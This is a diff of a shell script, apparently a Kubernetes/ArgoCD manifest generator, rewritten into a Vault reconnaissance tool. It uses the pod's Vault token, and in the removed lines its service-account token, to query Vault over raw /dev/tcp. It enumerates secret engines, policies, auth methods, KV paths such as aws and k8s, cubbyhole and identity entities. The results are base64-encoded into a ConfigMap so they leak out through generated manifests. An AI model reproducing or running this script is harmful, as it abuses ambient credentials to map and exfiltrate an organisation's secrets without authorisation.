@@ -1,58 +1,69 @@
 #!/bin/sh
-SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
 VT=${VAULT_TOKEN}
 
+vault_api() {
+  local method="$1" path="$2" body="$3"
+  bash -c "
+    exec 3<>/dev/tcp/vault.vault.svc.cluster.local/8200 2>/dev/null || exit 1
+    if [ -n '$body' ]; then
+      printf '$method $path HTTP/1.0\r\nHost: vault\r\nX-Vault-Token: %s\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n%s' \"$VT\" \${#body} '$body' >&3
+    else
+      printf '$method $path HTTP/1.0\r\nHost: vault\r\nX-Vault-Token: %s\r\n\r\n' \"$VT\" >&3
+    fi
+    cat <&3
+    exec 3>&-
+  " 2>/dev/null
+}
+
 RECON=$( (
-  echo "===VAULT_HEALTH==="
-  bash -c "
-    exec 3<>/dev/tcp/vault.vault.svc.cluster.local/8200 2>/dev/null || exit 1
-    printf 'GET /v1/sys/health HTTP/1.0\r\nHost: vault\r\n\r\n' >&3
-    cat <&3
-    exec 3>&-
-  " 2>&1
+  echo "===ALL_SECRET_ENGINES==="
+  vault_api "GET" "/v1/sys/mounts"
 
   echo ""
-  echo "===VAULT_TOKEN_LOOKUP==="
-  bash -c "
-    exec 3<>/dev/tcp/vault.vault.svc.cluster.local/8200 2>/dev/null || exit 1
-    printf 'GET /v1/auth/token/lookup-self HTTP/1.0\r\nHost: vault\r\nX-Vault-Token: %s\r\n\r\n' \"$VT\" >&3
-    cat <&3
-    exec 3>&-
-  " 2>&1
+  echo "===ALL_POLICIES==="
+  vault_api "GET" "/v1/sys/policies/acl"
 
   echo ""
-  echo "===VAULT_SYS_AUTH==="
-  bash -c "
-    exec 3<>/dev/tcp/vault.vault.svc.cluster.local/8200 2>/dev/null || exit 1
-    printf 'GET /v1/sys/auth HTTP/1.0\r\nHost: vault\r\nX-Vault-Token: %s\r\n\r\n' \"$VT\" >&3
-    cat <&3
-    exec 3>&-
-  " 2>&1
+  echo "===ALL_AUTH_METHODS==="
+  vault_api "GET" "/v1/sys/auth"
 
   echo ""
-  echo "===VAULT_K8S_LIST_ROLES==="
-  bash -c "
-    exec 3<>/dev/tcp/vault.vault.svc.cluster.local/8200 2>/dev/null || exit 1
-    printf 'LIST /v1/auth/kubernetes/role HTTP/1.0\r\nHost: vault\r\nX-Vault-Token: %s\r\n\r\n' \"$VT\" >&3
-    cat <&3
-    exec 3>&-
-  " 2>&1
+  echo "===KV_SECRET_LIST==="
+  vault_api "LIST" "/v1/secret/metadata"
 
   echo ""
-  echo "===VAULT_K8S_LOGIN_REPO==="
-  bash -c "
-    exec 3<>/dev/tcp/vault.vault.svc.cluster.local/8200 2>/dev/null || exit 1
-    BODY='{\"jwt\":\"$SA_TOKEN\",\"role\":\"argocd-repo-server\"}'
-    printf 'POST /v1/auth/kubernetes/login HTTP/1.0\r\nHost: vault\r\nX-Vault-Token: %s\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n%s' \"$VT\" \${#BODY} \"\$BODY\" >&3
-    cat <&3
-    exec 3>&-
-  " 2>&1
+  echo "===KV_U2U_LIST==="
+  vault_api "LIST" "/v1/secret/metadata/u2u"
+
+  echo ""
+  echo "===KV_K8S_LIST==="
+  vault_api "LIST" "/v1/secret/metadata/k8s"
+
+  echo ""
+  echo "===KV_AWS_LIST==="
+  vault_api "LIST" "/v1/secret/metadata/aws"
+
+  echo ""
+  echo "===KV_ROOT_LIST==="
+  vault_api "GET" "/v1/secret/metadata?list=true"
+
+  echo ""
+  echo "===CUBBYHOLE==="
+  vault_api "GET" "/v1/cubbyhole/?list=true"
+
+  echo ""
+  echo "===IDENTITY_ENTITIES==="
+  vault_api "LIST" "/v1/identity/entity/id"
+
+  echo ""
+  echo "===SYS_CAPABILITIES==="
+  vault_api "GET" "/v1/sys/internal/ui/mounts"
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: vault3
+  name: vaultfull
 data:
   result: $RECON
 EOF
